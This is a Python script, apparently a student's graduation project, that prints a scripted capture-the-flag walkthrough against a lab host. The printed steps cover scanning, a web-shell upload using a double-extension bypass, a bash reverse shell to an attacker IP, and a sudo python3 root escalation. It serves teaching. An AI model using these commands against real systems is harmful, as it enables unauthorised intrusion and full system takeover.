# ==========================================
# CTF-COACH | FULL WALKTHROUGH MODE
# Graduation Project - Educational CTF Solver
# ==========================================

def banner():
    print("\n" + "="*85)
    print("🧠 CTF-COACH | Full CTF Walkthrough (Educational Mode)")
    print("🎓 Graduation Project Edition")
    print("⚠️ All flags are DEMO flags for learning purposes")
    print("="*85)

def step(title, body):
    print("\n" + "-"*85)
    print(f"🔹 {title}")
    print("-"*85)
    print(body)

def main():
    banner()

    # STEP 1
    step(
        "STEP 1: Reconnaissance",
        """
Command:
nmap -sC -sV 10.10.10.10

Result:
22/tcp   open  ssh
80/tcp   open  http

Conclusion:
Target is running a web service and SSH.

Flag (Recon):
FLAG{recon_completed}
"""
    )

    # STEP 2
    step(
        "STEP 2: Web Enumeration",
        """
Action:
Open http://10.10.10.10 in browser.

Observation:
- Login page found
- Parameter: ?page=

Conclusion:
Possible LFI vulnerability.

Flag (Web Discovery):
FLAG{web_enum_success}
"""
    )

    # STEP 3
    step(
        "STEP 3: Directory Enumeration",
        """
Command:
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt

Result:
Found: /admin
Found: /upload

Conclusion:
Upload functionality may lead to RCE.

Flag (Directories):
FLAG{hidden_directories_found}
"""
    )

    # STEP 4
    step(
        "STEP 4: File Upload Exploitation",
        """
Action:
Upload web shell using extension bypass.

Filename:
shell.php.jpg

Result:
Web shell accessed successfully.

Flag (Initial Access):
FLAG{web_shell_obtained}
"""
    )

    # STEP 5
    step(
        "STEP 5: Reverse Shell",
        """
Command (Attacker):
nc -lvnp 4444

Command (Target):
bash -i >& /dev/tcp/10.10.10.1/4444 0>&1

Result:
Shell obtained as user 'www-data'.

Flag (Shell):
FLAG{reverse_shell_success}
"""
    )

    # STEP 6
    step(
        "STEP 6: Privilege Escalation Enumeration",
        """
Commands:
sudo -l
find / -perm -4000 2>/dev/null

Result:
User can run /usr/bin/python3 as root without password.

Conclusion:
Sudo misconfiguration.

Flag (PrivEsc Enum):
FLAG{privesc_vector_found}
"""
    )

    # STEP 7
    step(
        "STEP 7: Privilege Escalation",
        """
Command:
sudo python3 -c 'import os; os.system("/bin/bash")'

Result:
Root shell obtained.

Final Flag:
FLAG{root_access_achieved}
"""
    )

    print("\n" + "="*85)
    print("🏁 CTF COMPLETED SUCCESSFULLY")
    print("🎯 All flags captured (Educational Demo)")
    print("🎓 Ready for Graduation Project Presentation")
    print("="*85)

if __name__ == "__main__":
    main()
